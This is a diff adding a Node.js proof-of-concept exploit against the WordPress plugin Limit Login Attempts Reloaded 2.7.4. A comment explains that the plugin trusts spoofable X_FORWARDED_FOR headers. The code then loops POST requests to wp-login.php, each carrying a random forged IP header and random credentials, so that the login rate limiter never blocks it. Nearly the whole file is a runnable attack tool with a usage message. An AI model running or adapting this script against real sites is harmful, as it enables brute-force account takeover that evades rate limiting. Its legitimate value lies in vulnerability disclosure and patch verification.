@@ -1,0 +1,99 @@
+#!/usr/bin/env node
+const request = require("request")
+
+/**
+ * Exploit Title: Limit Login Attempts Reloaded by WPChef rate limiter bypass
+ * Date: 2019-04-08
+ * Exploit Author: isdampe
+ * Software Link: https://wordpress.org/plugins/limit-login-attempts-reloaded
+ * Version: 2.7.4
+ * Tested on: WordPress 5.1.1
+ *
+ * Description
+ * -----------
+ *
+ *  The plugin's primary goal is to limit the rate at which an individual can attempt
+ *  to authenticate with WordPress. Plugin has support for HTTP headers 
+ *  X_FORWARDED_FOR and X_SUCURI_CLIENTIP to allow rate limiting for users
+ *  when web servers are behind a reverse proxy service.
+ *  However, REMOTE_ADDR is not verified as a whitelisted proxy address, thus
+ *  allowing an attacker to easily forge either the X_FORWARDED_FOR or 
+ *  X_SUCURI_CLIENTIP headers to completely bypass the rate limiting service.
+ *
+ *  PoC
+ *  ---
+ */
+class LoginRequest
+{
+	constructor(loginUri, numberOfRepititions) {
+		this._loginUri = loginUri
+		this._numberOfRepititions = numberOfRepititions
+		this._count = 0
+	}
+
+	async process() {
+		await this._sendRequest()
+		if (this._count++ < this._numberOfRepititions)
+			this.process()
+	}
+
+	async _sendRequest() {
+		return new Promise(async (resolve, reject) => {
+			console.log(`Sending request ${this._count}...`)
+
+			request.post({
+				url : this._loginUri,
+				form: {
+					"log": this._getRandomString(),
+					"pwd": this._getRandomString(),
+					"wp-submit": "Log+In",
+					"redirect_to": "/wp-admin/",
+					"testcookie": "1"
+				},
+				headers: {
+					"X_FORWARDED_FOR": this._getRandomIp()
+				}
+			}, (err, res, body) => {
+				if (err)
+					console.error(err)
+
+				if (body.indexOf("Too many failed") > -1) {
+					reject("Login was rejected, exploit failed.")
+					return
+				}
+
+				resolve()
+				console.log(`\tRequest ${this._count} was not blocked`)
+			})
+
+		})
+	}
+
+	_getRandomString() {
+		const map = "abcdefghijklmnopqrstuvwxyz0123456789"
+		const length = Math.floor(Math.random() * 15) + 1
+		let buffer = ""
+		for (let i=0; i<length; ++i)
+			buffer += Math.floor(Math.random() * map.length)
+
+		return buffer
+	}
+
+	_getRandomIp() {
+		const bits = []
+		for (let x=0; x<4; ++x)
+			bits.push(Math.floor(Math.random() * 254)) + 1
+		return bits.join(".")
+	}
+
+}
+
+if (process.argv.length < 4) {
+	console.log("Usage: ./bypass-ip-block.js [url] [number_of_repititions]")
+	console.log("\turl:                     The url pointing to wp-login.php, (e.g. http://localhost/wp-login.php)")
+	console.log("\tnumber_of_repititions:   The number of login attempts to create (e.g. 500)")
+	process.exit(1)
+}
+
+const session = new LoginRequest(process.argv[2], process.argv[3])
+session.process()
